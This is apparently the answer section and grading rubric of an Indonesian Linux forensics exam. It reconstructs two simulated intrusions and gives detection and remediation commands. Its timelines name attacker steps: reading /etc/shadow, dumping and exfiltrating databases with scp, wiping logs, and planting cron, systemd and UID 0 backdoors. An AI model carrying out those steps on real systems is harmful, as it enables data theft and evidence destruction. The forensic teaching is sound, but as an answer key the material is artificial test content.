psort.py -o elastic timeline.plaso > elastic_output.json
```

**Langkah 5: Analisis dan visualisasi**
- Import CSV ke **Timeline Explorer** (Eric Zimmerman) untuk analisis interaktif
- Import ke **Excel/LibreOffice Calc** untuk filtering dan pivot tables
- Import ke **Elasticsearch + Kibana** untuk dashboard visual
- Cari pola: cluster aktivitas di jam tidak wajar, user escalation, file creation di /tmp

---

### Bagian C: Studi Kasus

#### Studi Kasus 1: Kompromi Server Database Kodam XIV

**Jawaban 1a — Timeline Kronologis (15 poin)**

| Waktu | Aktivitas | Fase Serangan |
|-------|-----------|---------------|
| 02:15:30 | SSH login via publickey dari 192.168.10.5 | **Initial Access** — kemungkinan compromised workstation atau stolen SSH key |
| 02:15:45 | `apt list --installed` | **Reconnaissance** — enumerasi software terinstall |
| 02:16:20 | `cat /etc/shadow` | **Credential Access** — membaca hash password |
| 02:16:45 | `mysqldump --all-databases` | **Collection** — dump seluruh database |
| 02:19:30 | `tar czf` kompres ke hidden file | **Staging** — persiapan exfiltration |
| 02:20:10 | `scp` ke 172.16.0.99 | **Exfiltration** — transfer data ke server eksternal |
| 02:21:30 | `shred` file dump | **Anti-forensik** — penghancuran bukti |
| 02:22:00 | Stop rsyslog | **Anti-forensik** — hentikan pencatatan log |
| 02:22:15 | Truncate auth.log | **Anti-forensik** — hapus log yang sudah tercatat |

Total durasi insiden: kurang dari 7 menit — menunjukkan serangan yang sudah direncanakan matang.

**Jawaban 1b — 8 Artefak Forensik Prioritas (15 poin)**

| Prioritas | Artefak | Lokasi | Informasi yang Diharapkan |
|-----------|---------|--------|---------------------------|
| 1 | systemd journal | `journalctl` | Log yang mungkin belum terhapus (binary, lebih sulit di-truncate) |
| 2 | .bash_history admin | /home/admin/.bash_history | Perintah yang dijalankan (jika belum dihapus) |
| 3 | SSH authorized_keys | /home/admin/.ssh/authorized_keys | Public key yang digunakan untuk login |
| 4 | SSH known_hosts | /home/admin/.ssh/known_hosts | Daftar server yang pernah dihubungi (172.16.0.99?) |
| 5 | wtmp/btmp | /var/log/wtmp, /var/log/btmp | Session login binary (lebih sulit dimanipulasi) |
| 6 | Crontab admin | /var/spool/cron/crontabs/admin | Persistence mechanism (dimodifikasi 02:23) |
| 7 | Filesystem timestamps | stat /tmp/, /etc/, /home/admin/ | Timeline aktivitas file |
| 8 | Network connections | ss, /var/log/kern.log | Koneksi ke 172.16.0.99 |

**Jawaban 1c — Sumber Bukti Alternatif (15 poin)**

Meskipun rsyslog dihentikan dan auth.log di-truncate, bukti alternatif tersedia:

1. **systemd-journald** — `journalctl --since "2026-01-20 02:00:00"` — journal binary terpisah dari rsyslog
2. **wtmp** — `last -f /var/log/wtmp` — mencatat login sessions, file binary terpisah
3. **btmp** — `lastb -f /var/log/btmp` — mencatat failed logins
4. **kern.log** — mungkin belum di-truncate, berisi USB dan network events
5. **Rotated logs** — `zgrep "admin" /var/log/auth.log.1.gz` — log sebelum rotasi mungkin masih ada
6. **MySQL logs** — /var/log/mysql/ — general query log dan slow query log
7. **Audit framework** — `ausearch -ts 01/20/2026 02:00:00` — jika auditd aktif
8. **Filesystem timestamps** — `find /tmp -newer /etc/hostname -ls` — artefak file yang dibuat

**Jawaban 1d — Analisis Anti-Forensik (15 poin)**

| Teknik | Perintah | Efektivitas | Counter-measure |
|--------|----------|-------------|-----------------|
| **shred** | `shred -n 3 -z` | Tinggi — overwrite 3x + zero-fill; data hampir tidak bisa di-recover dari HDD | Jika SSD, TRIM mungkin tidak efektif 100%; periksa journal ext4 |
| **Stop rsyslog** | `service rsyslog stop` | Sedang — menghentikan logging text, tapi journald mungkin masih aktif | Periksa systemd journal sebagai sumber alternatif |
| **Truncate auth.log** | `truncate -s 0` | Sedang — menghapus konten, tapi rotated logs (.1.gz) mungkin masih ada | Periksa auth.log.1, auth.log.2.gz |
| **Hidden filename** | `.backup.tar.gz` | Rendah — tidak muncul di `ls` biasa, tapi mudah ditemukan dengan `find` | `find / -name ".*" -type f` |

**Jawaban 1e — Rekomendasi Forensic Readiness (10 poin)**

1. **Centralized logging** — Kirim log ke remote syslog server (SIEM) yang terpisah dan tidak dapat diakses dari server sumber; gunakan TLS
2. **Immutable logging** — Implementasi append-only filesystem atau write-once media untuk log kritis
3. **SSH key management** — Rotasi SSH keys secara berkala, inventory semua authorized_keys, disable password authentication
4. **Auditd implementation** — Aktifkan Linux Audit Framework untuk mencatat syscall, file access, dan privilege escalation
5. **Network segmentation** — Isolasi server database dari network yang dapat mengakses internet; whitelist IP yang boleh SCP
6. **File Integrity Monitoring** — Implementasi AIDE/OSSEC untuk deteksi modifikasi file kritis (/etc/passwd, /etc/shadow, crontab, systemd services)
7. **Database audit logging** — Aktifkan MySQL audit plugin untuk mencatat semua query termasuk mysqldump

---

#### Studi Kasus 2: Backdoor Persistence pada Web Server Lantamal

**Jawaban 2a — Klasifikasi Persistence Mechanisms (15 poin)**

| Temuan | Jenis Persistence | Cara Kerja | Tingkat Bahaya |
|--------|-------------------|------------|----------------|
| 1. /tmp/.cache/update.sh | **Fileless malware via download-execute** | Script loops, download payload dari Pastebin, execute via bash | 🔴 Tinggi — payload dinamis, sulit di-signature |
| 2. Cron job nginx | **Scheduled task persistence** | Jalankan script setiap 3 menit sebagai user nginx | 🔴 Tinggi — auto-restart jika script mati |
| 3. sysmon UID 0 | **Backdoor account** | Akun dengan hak root, home di /dev/shm (RAM-based) | 🔴 Kritis — full root access |
| 4. SSH authorized_keys | **SSH key persistence** | Login tanpa password kapan saja | 🔴 Tinggi — persistent, sulit dideteksi |
| 5. systemd service | **Service persistence** | Binary C2 beacon, auto-restart, start at boot | 🔴 Kritis — multiple layers of persistence |

**Jawaban 2b — Rekonstruksi Kronologis (15 poin)**

Berdasarkan timestamp (semua crtime/mtime menunjuk ke 5 Januari):

1. **Initial compromise** — kemungkinan sebelum 5 Januari, melalui vulnerability web server (nginx) atau credential compromise
2. **5 Januari — Fase Persistence:**
   - Upload script `/tmp/.cache/update.sh` → fileless malware dropper
   - Modifikasi `/etc/passwd` → tambah backdoor account `sysmon` dengan UID 0
   - Tambah SSH key ke authorized_keys nginx → persistent SSH access
   - Install systemd service `sys-monitor.service` → C2 beacon
   - Konfigurasi cron job → periodic execution of update script
3. **5 Januari ke depan — Fase C2 & Operasi:**
   - C2 beacon aktif ke 198.51.100.77:8443
   - Script update.sh poll Pastebin setiap 3 menit untuk instruksi baru
4. **Terdeteksi saat audit rutin** — multiple artifacts ditemukan

**Jawaban 2c — Perintah Deteksi dan Analisis (15 poin)**

**Temuan 1 — Hidden script:**
```bash
find /tmp -name ".*" -type f -ls
cat /tmp/.cache/update.sh
stat /tmp/.cache/update.sh
```

**Temuan 2 — Malicious cron:**
```bash
crontab -l -u nginx
cat /var/spool/cron/nginx
ls -la /var/spool/cron/
```

**Temuan 3 — Backdoor account:**
```bash
awk -F: '$3 == 0 {print}' /etc/passwd
grep "sysmon" /var/log/secure
stat /etc/passwd
```

**Temuan 4 — SSH key injection:**
```bash
find / -name authorized_keys -exec ls -la {} \; -exec cat {} \;
stat /home/nginx/.ssh/authorized_keys
grep "Accepted publickey" /var/log/secure
```

**Temuan 5 — Malicious systemd service:**
```bash
systemctl status sys-monitor.service
cat /etc/systemd/system/sys-monitor.service
md5sum /usr/local/bin/.monitor
strings /usr/local/bin/.monitor | grep -i "connect\|http\|socket"
```

**Jawaban 2d — Multiple Persistence Mechanisms (10 poin)**

**Mengapa penyerang menggunakan multiple persistence:**
- **Redundancy** — jika satu mechanism ditemukan dan dihapus, yang lain tetap aktif
- **Defense-in-depth dari perspektif attacker** — layered approach mirip pertahanan berlapis
- **Berbagai trigger** — cron (time-based), systemd (boot-based), SSH key (on-demand)
- **Berbagai user context** — nginx user, root via UID 0, service account
- **Recovery capability** — jika server di-restart, multiple mechanisms memastikan akses kembali

**Risiko bagi penyerang:**
- Lebih banyak artifact = lebih mudah terdeteksi dalam audit
- Multiple IoC meningkatkan probabilitas detection
- Forensic investigator dapat merekonstruksi timeline lengkap

**Jawaban 2e — Rencana Remediation (10 poin)**

**Fase 1: Forensik (SEBELUM remediation)**
1. Buat full disk image sebelum modifikasi apapun
2. Dump memory jika server masih running
3. Capture network state (`ss -tnap`, `iptables -L -n`)
4. Dokumentasi semua temuan dengan hash dan timestamps

**Fase 2: Eradication**
1. Hapus backdoor account: `userdel sysmon`
2. Hapus malicious cron: `crontab -r -u nginx`
3. Disable dan hapus systemd service: `systemctl disable --now sys-monitor && rm /etc/systemd/system/sys-monitor.service`
4. Hapus malicious files: `/tmp/.cache/update.sh`, `/usr/local/bin/.monitor`
5. Hapus unauthorized SSH key dari authorized_keys
6. Reset password semua akun

**Fase 3: Hardening**
1. Implementasi SELinux/AppArmor enforcing mode
2. Konfigurasi auditd untuk monitoring file kritis
3. Implementasi file integrity monitoring (AIDE)
4. Restrict cron access: `/etc/cron.allow` hanya untuk user yang berwenang
5. Hardening SSH: disable root login, key-only auth, AllowUsers directive
6. Network: firewall egress filtering, block outbound ke IP C2
7. Monitoring: setup centralized logging ke SIEM terpisah

---

## Rubrik Penilaian

### Pilihan Ganda
- Setiap soal benar: 2 poin
- Total: 40 poin

### Uraian
- Soal ⭐: maksimal 5 poin
- Soal ⭐⭐: maksimal 8 poin  
- Soal ⭐⭐⭐: maksimal 12 poin
- Total: 115 poin

### Studi Kasus
- Studi Kasus 1: 65 poin
- Studi Kasus 2: 65 poin
- Total: 130 poin

### Total Keseluruhan: 285 poin

---

## License

This repository is licensed under the **Creative Commons Attribution 4.0 International (CC BY 4.0)**.

Commercial use is permitted, provided attribution is given to the author.

© 2026 Anindito
